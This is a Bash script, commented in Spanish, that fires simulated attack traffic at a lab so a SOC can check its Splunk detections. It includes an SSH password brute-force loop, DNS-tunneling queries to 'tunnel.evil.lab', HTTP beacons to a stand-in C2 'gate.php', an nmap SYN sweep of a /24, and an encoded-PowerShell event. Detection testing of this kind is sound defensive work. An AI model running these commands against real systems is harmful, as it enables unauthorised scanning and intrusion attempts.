#!/usr/bin/env bash
# =====================================================================
#  Generador de eventos de prueba para validar detecciones del SOC
#  Requiere: hydra, nmap, curl, dig, docker (para ejecutar en victim-linux)
# =====================================================================
set -uo pipefail

VICTIM_LINUX_IP=${VICTIM_LINUX_IP:-172.31.0.10}
VICTIM_WEB_URL=${VICTIM_WEB_URL:-http://localhost:8080}
SPLUNK_HEC=${SPLUNK_HEC:-http://localhost:8088}
HEC_TOKEN=${HEC_TOKEN:-$(grep SPLUNK_HEC_TOKEN ../docker/.env | cut -d= -f2)}

usage() {
  cat <<EOF
Uso: $0 <caso>

Casos:
  uc001   SSH brute force
  uc003   PowerShell EncodedCommand (event vía HEC)
  uc004   DNS tunneling (queries largas)
  uc007   Beacon HTTP hacia IoC MISP simulado
  uc008   Nmap scan a red víctima
  all     Ejecuta todos los anteriores en secuencia
EOF
}

log() { echo "[$(date -u +%H:%M:%S)] $*"; }

send_hec() {
  local sourcetype=$1 event=$2
  curl -sk "${SPLUNK_HEC}/services/collector/event" \
    -H "Authorization: Splunk ${HEC_TOKEN}" \
    -d "{\"sourcetype\":\"${sourcetype}\",\"event\":${event}}" >/dev/null
}

uc001() {
  log "UC-001: SSH brute force contra ${VICTIM_LINUX_IP}"
  for i in $(seq 1 15); do
    (echo "id"; sleep 1) | timeout 3 ssh -o StrictHostKeyChecking=no \
      -o ConnectTimeout=2 -o PreferredAuthentications=password \
      -o PubkeyAuthentication=no "user${i}@${VICTIM_LINUX_IP}" 2>/dev/null || true
    printf "."
  done; echo
  log "UC-001: enviados 15 intentos."
}

uc003() {
  log "UC-003: PowerShell EncodedCommand simulado (HEC)"
  local host="WKS-042"
  local user="apereira"
  local cmd_b64="VwByAGkAdABlAC0ASABvAHMAdAAgACcAVABlAHMAdAAgAFMATwBDAC0ATABhAGIAJwA="
  send_hec "sysmon:operational" "{\"EventCode\":1,\"host\":\"${host}\",\"user\":\"${user}\",\"image\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"cmdline\":\"powershell.exe -EncodedCommand ${cmd_b64}\",\"parent_image\":\"explorer.exe\"}"
  log "UC-003: evento enviado a HEC."
}

uc004() {
  log "UC-004: DNS tunneling — 30 queries largas"
  for i in $(seq 1 30); do
    local label=$(head -c 80 /dev/urandom | base64 | tr -d '/+=\n' | head -c 80)
    dig +short +time=1 "${label}.tunnel.evil.lab" @1.1.1.1 >/dev/null 2>&1 || true
    printf "."
  done; echo
}

uc007() {
  log "UC-007: Beacon HTTP hacia IoC MISP simulado"
  for i in $(seq 1 10); do
    curl -s --max-time 2 "http://malware-tracker.evil/gate.php?id=${i}" >/dev/null 2>&1 || true
    sleep 3
  done
}

uc008() {
  log "UC-008: Nmap SYN scan a 172.31.0.0/24"
  nmap -sS -Pn -T4 -p- --min-rate 500 172.31.0.0/24 >/dev/null 2>&1 || \
    log "nmap no disponible — instalar con: sudo apt install nmap"
}

case "${1:-}" in
  uc001) uc001 ;;
  uc003) uc003 ;;
  uc004) uc004 ;;
  uc007) uc007 ;;
  uc008) uc008 ;;
  all)   uc001; uc003; uc004; uc007; uc008 ;;
  *)     usage; exit 1 ;;
esac

log "Listo. Verifica alertas en Splunk: index=_audit action=\"alert fired\""
